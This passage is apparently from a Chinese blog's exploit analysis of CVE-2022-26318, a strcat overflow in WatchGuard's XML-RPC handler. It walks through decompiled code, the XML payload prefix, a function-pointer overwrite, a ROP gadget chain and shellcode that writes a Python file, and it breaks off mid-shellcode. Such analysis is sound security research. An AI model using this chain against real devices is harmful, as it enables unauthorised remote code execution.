class="number">0</span>;</span><br><span class="line">            bzero(haystack, <span class="number">0x186A0</span>uLL);</span><br><span class="line">            <span class="keyword">do</span></span><br><span class="line">            &#123;</span><br><span class="line">                Str = FCGX_GetStr(haystack, v22, a1);</span><br><span class="line">                <span class="keyword">if</span> ( !Str )</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                v27 = <span class="number">0LL</span>;</span><br><span class="line">                v27 = <span class="built_in">strstr</span>(haystack, <span class="string">&quot;!ENTITY&quot;</span>);</span><br><span class="line">                <span class="comment">// ...</span></span><br><span class="line">                <span class="comment">// ...</span></span><br><span class="line">                <span class="keyword">if</span> ( is_gzip )                          <span class="comment">// 如果压缩了，要先解压</span></span><br><span class="line">                &#123;</span><br><span class="line">                    v24 = <span class="number">0</span>;</span><br><span class="line">                    v4 = &amp;haystack[v28];</span><br><span class="line">                    v5 = Str;</span><br><span class="line">                    v6 = <span class="number">0LL</span>;</span><br><span class="line">                    v7 = v3;</span><br><span class="line">                    v8 = <span class="number">99999</span>;</span><br><span class="line">                    v25 = <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">while</span> ( !v25 )</span><br><span class="line">                    &#123;</span><br><span class="line">                        v25 = inflate(&amp;v4, <span class="number">2LL</span>);            <span class="comment">// 解压数据</span></span><br><span class="line">                        <span class="keyword">if</span> ( v25 )</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="keyword">if</span> ( v25 == <span class="number">1</span> )</span><br><span class="line">                            &#123;</span><br><span class="line">                                v3[v9] = <span class="number">0</span>;</span><br><span class="line">                                v32 = xmlParseChunk(PushParserCtxt, v3, v9, <span class="number">0LL</span>);</span><br><span class="line">                                v24 += v9;</span><br><span class="line">                                v9 = <span class="number">0LL</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">else</span></span><br><span class="line">                            &#123;</span><br><span class="line">                                v32 = <span class="number">-1</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span></span><br><span class="line">                        &#123;</span><br><span class="line">                            v32 = xmlParseChunk(PushParserCtxt, v3, v9, <span class="number">0LL</span>);</span><br><span class="line">                            <span class="keyword">if</span> ( v32 )</span><br><span class="line">                                <span class="keyword">goto</span> LABEL_50;</span><br><span class="line">                            v24 += v9;</span><br><span class="line">                            v9 = <span class="number">0LL</span>;</span><br><span class="line">                            v8 = <span class="number">99999</span>;</span><br><span class="line">                            v7 = v3;</span><br><span class="line">                            <span class="keyword">if</span> ( !v5 )</span><br><span class="line">                                <span class="keyword">goto</span> LABEL_48;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// ...</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>用户提交的数据应该是 XML 格式，程序使用 libxml2 对数据进行解析，在函数开头使用了 xmlSAX2InitDefaultSAXHandler，初始化 SAX handler，SAX 是一种 XML 解析方式，在 libxml2 中使用 SAX 解析 XML 时需要初始化一些 handler，我根据 libxml2 源码对部分 handler 进行了重命名</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">s[<span class="number">12</span>] = startDocument;</span><br><span class="line">s[<span class="number">13</span>] = endDocument;</span><br><span class="line">s[<span class="number">29</span>] = startElementNs;</span><br><span class="line">s[<span class="number">30</span>] = endElementNs;</span><br><span class="line">s[<span class="number">17</span>] = characters;</span><br><span class="line">s[<span class="number">6</span>] = <span class="number">0LL</span>;                                   <span class="comment">// entityDecl</span></span><br></pre></td></tr></table></figure></div>

<p>其中值得注意的是 startElementNs，根据源码注释，这个回调函数会在每次一个新的 element 开始时被调用</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">SAX2 callback when an element start has been detected by the parser.</span><br><span class="line">It provides the namespace informations for the element, as well as</span><br><span class="line">the new namespace declarations on the element.</span><br></pre></td></tr></table></figure></div>

<p>也就是说每当遇到一个新的 xml 标签开始时，程序会执行此函数，而这些 handler 由 Watchguard 开发者自行实现。</p>
<p>我们来看 startElementNs 和 endElementNs 函数代码</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> *__fastcall <span class="title function_">startElementNs</span><span class="params">(__int64 a1, <span class="type">const</span> <span class="type">char</span> *tag_name)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> *result; <span class="comment">// rax</span></span><br><span class="line">    <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">    __int64 v4; <span class="comment">// rdi</span></span><br><span class="line">    __int64 v5; <span class="comment">// rax</span></span><br><span class="line">    __int64 v6; <span class="comment">// [rsp+30h] [rbp-30h]</span></span><br><span class="line">    __int64 v7; <span class="comment">// [rsp+38h] [rbp-28h]</span></span><br><span class="line">    <span class="type">void</span> *v8; <span class="comment">// [rsp+40h] [rbp-20h]</span></span><br><span class="line">    _QWORD *v9; <span class="comment">// [rsp+48h] [rbp-18h]</span></span><br><span class="line">    _QWORD *v10; <span class="comment">// [rsp+50h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">    result = *(a1 + <span class="number">76</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !result )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( *(a1 + <span class="number">0x50</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">switch</span> ( *(a1 + <span class="number">80</span>) )</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                    <span class="keyword">if</span> ( strcasecmp(tag_name, <span class="string">&quot;methodName&quot;</span>) )</span><br><span class="line">                    &#123;</span><br><span class="line">                        result = a1;</span><br><span class="line">                        ++*(a1 + <span class="number">76</span>);</span><br><span class="line">                        <span class="keyword">return</span> result;</span><br><span class="line">                    &#125;</span><br><span class="line">                    *(a1 + <span class="number">80</span>) = <span class="number">2</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                    <span class="keyword">if</span> ( !strcasecmp(tag_name, <span class="string">&quot;member&quot;</span>) )</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">if</span> ( !*(a1 + <span class="number">108</span>) || !*(a1 + <span class="number">120</span>) || !*(a1 + <span class="number">128</span>) )</span><br><span class="line">                        &#123;</span><br><span class="line">                            result = a1;</span><br><span class="line">                            ++*(a1 + <span class="number">76</span>);</span><br><span class="line">                            <span class="keyword">return</span> result;</span><br><span class="line">                        &#125;</span><br><span class="line">                        v10 = <span class="built_in">calloc</span>(<span class="number">1uLL</span>, <span class="number">0x30</span>uLL);</span><br><span class="line">                        <span class="keyword">if</span> ( !v10 )</span><br><span class="line">                        &#123;</span><br><span class="line">                            fwrite(<span class="string">&quot;No memory!!!!\n&quot;</span>, <span class="number">1uLL</span>, <span class="number">0xE</span>uLL, <span class="built_in">stderr</span>);</span><br><span class="line">                            result = a1;</span><br><span class="line">                            ++*(a1 + <span class="number">76</span>);</span><br><span class="line">                            <span class="keyword">return</span> result;</span><br><span class="line">                        &#125;</span><br><span class="line">                        *(a1 + <span class="number">80</span>) = <span class="number">4</span>;</span><br><span class="line">                        *v10 = *(*(a1 + <span class="number">128</span>) + <span class="number">24LL</span>);</span><br><span class="line">                        *(*(a1 + <span class="number">128</span>) + <span class="number">24LL</span>) = v10;</span><br><span class="line">                        ++*(*(a1 + <span class="number">128</span>) + <span class="number">16LL</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">if</span> ( !strcasecmp(tag_name, <span class="string">&quot;param&quot;</span>) )</span><br><span class="line">                    &#123;</span><br><span class="line">                        v9 = <span class="built_in">calloc</span>(<span class="number">1uLL</span>, <span class="number">0x40</span>uLL);</span><br><span class="line">                        <span class="keyword">if</span> ( !v9 )</span><br><span class="line">                        &#123;</span><br><span class="line">                            ++*(a1 + <span class="number">76</span>);</span><br><span class="line">                            result = __errno_location();</span><br><span class="line">                            *result = <span class="number">12</span>;</span><br><span class="line">                            <span class="keyword">return</span> result;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span> ( *(a1 + <span class="number">128</span>) )</span><br><span class="line">                        &#123;</span><br><span class="line">                            **(a1 + <span class="number">128</span>) = v9;</span><br><span class="line">                            v9[<span class="number">1</span>] = *(a1 + <span class="number">128</span>);</span><br><span class="line">                            *(a1 + <span class="number">128</span>) = v9;</span><br><span class="line">                        &#125;</span><br><span class="line">                        *(a1 + <span class="number">128</span>) = v9;</span><br><span class="line">                        <span class="keyword">if</span> ( !*(a1 + <span class="number">120</span>) )</span><br><span class="line">                            *(a1 + <span class="number">120</span>) = v9;</span><br><span class="line">                        ++*(a1 + <span class="number">108</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                    <span class="keyword">if</span> ( !strcasecmp(tag_name, <span class="string">&quot;name&quot;</span>) )</span><br><span class="line">                        *(a1 + <span class="number">80</span>) = <span class="number">5</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">                    <span class="keyword">if</span> ( !strcasecmp(tag_name, <span class="string">&quot;value&quot;</span>) )</span><br><span class="line">                        *(a1 + <span class="number">80</span>) = <span class="number">7</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">                    <span class="keyword">if</span> ( !strcasecmp(tag_name, <span class="string">&quot;value&quot;</span>) )</span><br><span class="line">                    &#123;</span><br><span class="line">                        *(a1 + <span class="number">80</span>) = <span class="number">7</span>;</span><br><span class="line">                        v8 = <span class="built_in">calloc</span>(<span class="number">1uLL</span>, <span class="number">0x30</span>uLL);</span><br><span class="line">                        <span class="keyword">if</span> ( v8 )</span><br><span class="line">                        &#123;</span><br><span class="line">                            v3 = <span class="built_in">strlen</span>(*(*(*(a1 + <span class="number">128</span>) + <span class="number">24LL</span>) + <span class="number">8LL</span>));</span><br><span class="line">                            *(v8 + <span class="number">1</span>) = sub_40629C(*(v8 + <span class="number">1</span>), <span class="number">0</span>, *(*(*(a1 + <span class="number">128</span>) + <span class="number">24LL</span>) + <span class="number">8LL</span>), v3);</span><br><span class="line">                            *v8 = *(*(a1 + <span class="number">128</span>) + <span class="number">24LL</span>);</span><br><span class="line">                            *(*(a1 + <span class="number">128</span>) + <span class="number">24LL</span>) = v8;</span><br><span class="line">                            ++*(*(a1 + <span class="number">128</span>) + <span class="number">16LL</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span></span><br><span class="line">                        &#123;</span><br><span class="line">                            fwrite(<span class="string">&quot;No memory!!!!\n&quot;</span>, <span class="number">1uLL</span>, <span class="number">0xE</span>uLL, <span class="built_in">stderr</span>);</span><br><span class="line">                            ++*(a1 + <span class="number">76</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">                    <span class="keyword">if</span> ( !strcasecmp(tag_name, <span class="string">&quot;base64&quot;</span>) )</span><br><span class="line">                    &#123;</span><br><span class="line">                        v4 = BIO_s_mem(tag_name);</span><br><span class="line">                        v7 = BIO_new(v4);</span><br><span class="line">                        v5 = BIO_f_base64(v4);</span><br><span class="line">                        v6 = BIO_new(v5);</span><br><span class="line">                        <span class="keyword">if</span> ( v6 &amp;&amp; v7 )</span><br><span class="line">                            BIO_push(v6, v7);</span><br><span class="line">                        BIO_set_flags(v6, <span class="number">256LL</span>);</span><br><span class="line">                        *(*(*(a1 + <span class="number">128</span>) + <span class="number">24LL</span>) + <span class="number">32LL</span>) = v7;</span><br><span class="line">                        *(*(*(a1 + <span class="number">128</span>) + <span class="number">24LL</span>) + <span class="number">40LL</span>) = v6;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> ( *(*(*(a1 + <span class="number">128</span>) + <span class="number">24LL</span>) + <span class="number">16LL</span>) )</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="built_in">free</span>(*(*(*(a1 + <span class="number">128</span>) + <span class="number">24LL</span>) + <span class="number">16LL</span>));</span><br><span class="line">                        *(*(*(a1 + <span class="number">128</span>) + <span class="number">24LL</span>) + <span class="number">16LL</span>) = <span class="number">0LL</span>;</span><br><span class="line">                        *(*(*(a1 + <span class="number">128</span>) + <span class="number">24LL</span>) + <span class="number">24LL</span>) = <span class="number">0</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> ( !strcasecmp(tag_name, <span class="string">&quot;struct&quot;</span>) )</span><br><span class="line">                        *(a1 + <span class="number">80</span>) = <span class="number">10</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> ( strcasecmp(tag_name, <span class="string">&quot;methodCall&quot;</span>) )</span><br><span class="line">            &#123;</span><br><span class="line">                result = a1;</span><br><span class="line">                ++*(a1 + <span class="number">0x4C</span>);</span><br><span class="line">                <span class="keyword">return</span> result;</span><br><span class="line">            &#125;</span><br><span class="line">            *(a1 + <span class="number">80</span>) = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        *&amp;s[<span class="built_in">strlen</span>(s)] = <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">        <span class="built_in">strcat</span>(s, tag_name);</span><br><span class="line">        unk_427194 = <span class="number">1</span>;</span><br><span class="line">        unk_427198 = <span class="number">0</span>;</span><br><span class="line">        result = a1;</span><br><span class="line">        ++*(a1 + <span class="number">64</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">endElementNs</span><span class="params">(__int64 a1, <span class="type">const</span> <span class="type">char</span> *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">    __int64 v2; <span class="comment">// rax</span></span><br><span class="line">    __int64 v3; <span class="comment">// rbx</span></span><br><span class="line">    <span class="type">void</span> **ptr; <span class="comment">// [rsp+28h] [rbp-28h]</span></span><br><span class="line">    <span class="type">char</span> *v6; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">    ++unk_427190;</span><br><span class="line">    v6 = <span class="built_in">strrchr</span>(s, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    --*(a1 + <span class="number">64</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v6 )</span><br><span class="line">        *v6 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !unk_427198 )</span><br><span class="line">        unk_427198 = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">switch</span> ( *(a1 + <span class="number">80</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">if</span> ( *(a1 + <span class="number">88</span>) )</span><br><span class="line">                strcasecmp(*(a1 + <span class="number">88</span>), <span class="string">&quot;/agent/upgrade&quot;</span>);</span><br><span class="line">            LODWORD(v2) = a1;</span><br><span class="line">            *(a1 + <span class="number">80</span>) = <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            LODWORD(v2) = a1;</span><br><span class="line">            *(a1 + <span class="number">80</span>) = <span class="number">6</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">            *(a1 + <span class="number">80</span>) = <span class="number">8</span>;</span><br><span class="line">            <span class="keyword">if</span> ( *(*(*(a1 + <span class="number">128</span>) + <span class="number">24LL</span>) + <span class="number">40LL</span>) )</span><br><span class="line">            &#123;</span><br><span class="line">                BIO_free_all(*(*(*(a1 + <span class="number">128</span>) + <span class="number">24LL</span>) + <span class="number">40LL</span>));</span><br><span class="line">                *(*(*(a1 + <span class="number">128</span>) + <span class="number">24LL</span>) + <span class="number">40LL</span>) = <span class="number">0LL</span>;</span><br><span class="line">                *(*(*(a1 + <span class="number">128</span>) + <span class="number">24LL</span>) + <span class="number">32LL</span>) = <span class="number">0LL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ( *(*(*(a1 + <span class="number">128</span>) + <span class="number">24LL</span>) + <span class="number">24LL</span>) )</span><br><span class="line">            &#123;</span><br><span class="line">                ++*(*(*(a1 + <span class="number">128</span>) + <span class="number">24LL</span>) + <span class="number">24LL</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            v2 = *(*(*(a1 + <span class="number">128</span>) + <span class="number">24LL</span>) + <span class="number">16LL</span>);</span><br><span class="line">            <span class="keyword">if</span> ( !v2 )</span><br><span class="line">            &#123;</span><br><span class="line">                v3 = *(*(a1 + <span class="number">128</span>) + <span class="number">24LL</span>);</span><br><span class="line">                *(v3 + <span class="number">16</span>) = <span class="built_in">malloc</span>(<span class="number">1uLL</span>);</span><br><span class="line">                v2 = *(*(*(a1 + <span class="number">128</span>) + <span class="number">24LL</span>) + <span class="number">16LL</span>);</span><br><span class="line">                <span class="keyword">if</span> ( v2 )</span><br><span class="line">                &#123;</span><br><span class="line">                    v2 = *(*(*(a1 + <span class="number">128</span>) + <span class="number">24LL</span>) + <span class="number">16LL</span>);</span><br><span class="line">                    *v2 = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            LODWORD(v2) = strcasecmp(a2, <span class="string">&quot;member&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( !v2 )</span><br><span class="line">            &#123;</span><br><span class="line">                *(a1 + <span class="number">80</span>) = <span class="number">3</span>;</span><br><span class="line">                v2 = *(a1 + <span class="number">128</span>);</span><br><span class="line">                <span class="keyword">if</span> ( v2 )</span><br><span class="line">                &#123;</span><br><span class="line">                    v2 = *(*(a1 + <span class="number">128</span>) + <span class="number">24LL</span>);</span><br><span class="line">                    <span class="keyword">if</span> ( v2 )</span><br><span class="line">                    &#123;</span><br><span class="line">                        v2 = *(*(*(a1 + <span class="number">128</span>) + <span class="number">24LL</span>) + <span class="number">8LL</span>);</span><br><span class="line">                        <span class="keyword">if</span> ( !v2 )</span><br><span class="line">                        &#123;</span><br><span class="line">                            ptr = *(*(a1 + <span class="number">128</span>) + <span class="number">24LL</span>);</span><br><span class="line">                            *(*(a1 + <span class="number">128</span>) + <span class="number">24LL</span>) = *ptr;</span><br><span class="line">                            <span class="keyword">if</span> ( ptr[<span class="number">2</span>] )</span><br><span class="line">                                <span class="built_in">free</span>(ptr[<span class="number">2</span>]);</span><br><span class="line">                            <span class="built_in">free</span>(ptr);</span><br><span class="line">                            v2 = *(a1 + <span class="number">128</span>);</span><br><span class="line">                            --*(v2 + <span class="number">16</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>关键在于 (a1 + 80) 变量(简称为 swi)，此变量控制了分支结构的执行顺序，我们按照 exp 中构造的 xml 节点进行分析。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;methodCall&gt;&lt;methodName&gt;agent.login&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;struct&gt;&lt;member&gt;&lt;value&gt;&lt;AAAAA...AAMFA&gt;&lt;BBBBMFA&gt;&lt;BBBBMFA&gt;&lt;BBBBMFA&gt;...&lt;BBBBMFA&gt;&lt;BBBBMFA&gt;payload</span><br></pre></td></tr></table></figure></div>

<p>首先解析到 methodCall 开始标签，调用 startElementNs 函数，解析后将 swi 设置为 1</p>
<p>遇到 methodCall 结束标签，swi &#x3D;&#x3D; 1 没有匹配情况，值不变</p>
<p>遇到 methodName 开始标签，swi &#x3D;&#x3D; 1 在 startElementNs 中对应 case 1，设置 swi &#x3D; 2</p>
<p>遇到 methodName 结束标签，swi &#x3D;&#x3D; 2 在 endElementNs 中对应 case 2，设置 swi &#x3D; 3</p>
<p>遇到 params 开始标签，swi &#x3D;&#x3D; 3 在 startElementNs 对应 case 3，不过没有匹配任何情况，swi 不变</p>
<p>遇到 param 开始标签，swi &#x3D;&#x3D; 3 在 startElementNs 对应 case 3，有匹配情况但 swi 不变</p>
<p>遇到 value 开始标签，swi &#x3D;&#x3D; 3 在 startElementNs 对应 case 3，没有匹配情况，swi 不变</p>
<p>遇到 struct 开始标签，swi &#x3D;&#x3D; 3 在 startElementNs 对应 case 3，没有匹配情况，swi 不变</p>
<p>遇到 member 开始标签，swi &#x3D;&#x3D; 3 在 startElementNs 对应 case 3，有匹配情况，设置 swi &#x3D; 4</p>
<p>后续存在大量填充的开始标签，由于此时 swi &#x3D; 4，在 startElementNs 中对应  case &#x3D;&#x3D; 4，标签名不等于 name，会直接 break 跳出 switch 结构。</p>
<p>最终会来到关键点 startElementNs 的第 136 行，调用 strcat 函数将 tag_name 即标签名直接拼接到全局变量 s 中。</p>
<p>显然此处缺少对 tag_name 长度的检查，如果构造超长的 tag 填充到全局变量会导致变量溢出。</p>
<h2 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h2><p><strong>注：调试过程中程序多次重启，所以某些图片中地址可能不同</strong></p>
<p>首先 payload 头部需要构造合适的标签序列，让 startElementNs 函数最终能够达到 “稳定” 状态，即如 exp 中所构造的，让 swi 变量始终等于 4。</p>
<p>所以 payload 第一部分为</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = &quot;&lt;methodCall&gt;&lt;methodName&gt;agent.login&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;struct&gt;&lt;member&gt;&lt;value&gt;&quot;.encode()</span><br></pre></td></tr></table></figure></div>

<p>这样后续标签只要不等于 name，就可以一直触发 strcat 部分代码</p>
<p>接着查看一下全局变量 s 附近的内存布局</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cve-2022-26318-3.png"
                     
                ></p>
<p>在拷贝第一个标签时看到变量 s 位于 0x427360，由于程序没有开启 PIE，所以这个地址固定。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cve-2022-26318-4.png"
                     
                ></p>
<p>在 s 下方刚好衔接了程序的 heap 段，所以理论上有两种利用思路，其一是通过溢出覆盖掉 bss 段中其他全局变量，这些变量可能在程序某处被使用，其二则是构造足够长的数据覆盖 heap 中的数据，利用堆的某些操作实现利用。</p>
<p>实际分析程序可以看到 s 下方唯一一个变量 0x427760 默认值为 0，暂时没看到可利用的点，所以只能通过操作堆尝试利用。</p>
<p><strong>调试 EXP</strong></p>
<p>调试原作者的 exp，其 payload 首先构造的很多用于填充的标签，第一部分用一个标签填充 3184 个字节，拷贝后内存布局：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cve-2022-26318-5.png"
                     
                ></p>
<p>从地址 0x428000 开始就是 heap 区域。</p>
<p>第二部分是 3680 个 &lt;BBBBMFA&gt; 标签，相当于填充了 3680 * (7 + 1) &#x3D; 29440 字节，但实际调试中这些字节不会被全部覆盖到 heap 中，当覆盖到地址 0x429e60 时，继续执行就会调起新的程序。</p>
<p>观察 0x429e60 附近的内存：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cve-2022-26318-6.png"
                     
                ></p>
<p>地址 0x429e68 为 startElementNs 函数指针，地址 0x429e70 为 endElementNs 函数指针。</p>
<p>最后一个标签覆盖后 0x429e68 地址会变为 0x41464d，然后在地址 0x7f01f16024a1 会调用此指针</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cve-2022-26318-7.png"
                     
                ></p>
<p>我猜测 payload 覆盖了 libxml2 中的 SAX handler 结构体(xmlSAXHandler 结构？)，程序准备解析下一个标签时要调用 startElementNs 函数指针，但是此时指针已经被破坏，而 0x41464d 对应指令为 ret 0x90be</p>
<p>需要注意的是，我们输入的 payload 也存在于栈上：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cve-2022-26318-8.png"
                     
                ></p>
<p>调用 0x41464d 指针使用的是 call 指令，所以 ret 指令会直接回到 call 下一条指令继续执行，同时 rsp 会增大(下移) 0x90c6 字节，随后进入函数返回流程，最终执行到 ret 指令时内存布局：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cve-2022-26318-9.png"
                     
                ></p>
<p>我们发现此时已经进入 ROP 流程，栈中的 payload 刚好对应 exp 中第三部分 payload</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">payload += <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;\x20\x50\x40&#x27;</span> + ...</span><br></pre></td></tr></table></figure></div>

<p>ROP 所用的 gadget 列举如下</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x405020          ret</span><br><span class="line">0x40f968          ret 2</span><br><span class="line">0x405020          ret</span><br><span class="line"></span><br><span class="line">0x41d60e          pop    rax</span><br><span class="line">0x41d60f          pop    rbx</span><br><span class="line">0x41d610          pop    rbp</span><br><span class="line">0x41d611          ret </span><br><span class="line"></span><br><span class="line">0x405e7d          mov    rbp, rsp                 # 1. 将 rsp 放到 rbp</span><br><span class="line">0x405e80          call   rax       &lt;0x41d5b1&gt;</span><br><span class="line"></span><br><span class="line">0x41d5b1          pop    rsi</span><br><span class="line">0x41d5b2          pop    r15</span><br><span class="line">0x41d5b4          ret              &lt;0x405e7c&gt;</span><br><span class="line"></span><br><span class="line">0x405e7c          push   rbp                      # 2. 将 rbp 入栈</span><br><span class="line">0x405e7d          mov    rbp, rsp</span><br><span class="line">0x405e80          call   rax       &lt;0x41d5b1&gt;</span><br><span class="line"></span><br><span class="line">0x41d5b1          pop    rsi</span><br><span class="line">0x41d5b2          pop    r15</span><br><span class="line">0x41d5b4          ret              &lt;0x41d2ad&gt;</span><br><span class="line"></span><br><span class="line">0x41d2ad          lea    rdx, [rbp - 0x80]       # 3. rbp - 0x80 地址放到 rdx</span><br><span class="line">0x41d2b1          mov    rsi, rdx</span><br><span class="line">0x41d2b4          mov    rdi, rcx</span><br><span class="line">0x41d2b7          call   rax       &lt;0x41d5b1&gt;</span><br><span class="line"></span><br><span class="line">0x41d5b1          pop    rsi</span><br><span class="line">0x41d5b2          pop    r15</span><br><span class="line">0x41d5b4          ret              &lt;0x41d60e&gt;</span><br><span class="line"></span><br><span class="line">0x41d60e          pop    rax                     # 4. 0xc0</span><br><span class="line">0x41d60f          pop    rbx</span><br><span class="line">0x41d610          pop    rbp</span><br><span class="line">0x41d611          ret              &lt;0x40a92a&gt;</span><br><span class="line"></span><br><span class="line">0x40a92a          add    rax, rdx                # 5. rdx + 0xc0，修正栈地址指向 shellcode</span><br><span class="line">0x40a92d          jmp    rax       &lt;0x7ffe54fa6810&gt;   # 6. 跳转到 shellcode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">==== shellcode ====</span><br><span class="line">0x7ffcc7d7c070    lea    rdi, [rip + 0x9d]</span><br><span class="line">0x7ffcc7d7c077    mov    esi, 0x241</span><br><span class="line">0x7ffcc7d7c07c    mov    edx, 0x1b6</span><br><span class="line">0x7ffcc7d7c081    mov    eax, 2</span><br><span class="line">0x7ffcc7d7c086    syscall  &lt;SYS_open&gt;</span><br><span class="line">        file: 0x7ffcc7d7c114 ◂— &#x27;/tmp/test.py&#x27;</span><br><span class="line">        oflag: 0x241</span><br><span class="line">        vararg: 0x1b6</span><br><span class="line">0x7ffcc7d7c088    mov    qword ptr [rip + 0x92], rax</span><br><span class="line">0x7ffcc7d7c08f    mov    rdx, qword ptr [rip + 0x93]</span><br><span class="line">0x7ffcc7d7c096    lea    rsi, [rip + 0x94]</span><br><span class="line">0x7ffcc7d7c09d    mov    rdi, qword ptr [rip + 0x7d]</span><br><span class="line">0x7ffcc7d7c0a4    mov    eax, 1</span><br><span class="line">0x7ffcc7d7c0a9    syscall  &lt;SYS_write&gt;</span><br><span class="line">        fd: 0xd</span><br><span class="line">        buf: 0x7ffcc7d7c131 ◂— 0x732074726f706d69 (&#x27;import s&#x27;)</span><br><span class="line">        n: 0x1ef</span><br><span class="line">0x7ffcc7d7c0ab    mov    rdi, qword ptr [rip + 0x6f]</span><br><span class="line">0x7ffcc7d7c0b2    mov    eax, 3</span><br><span 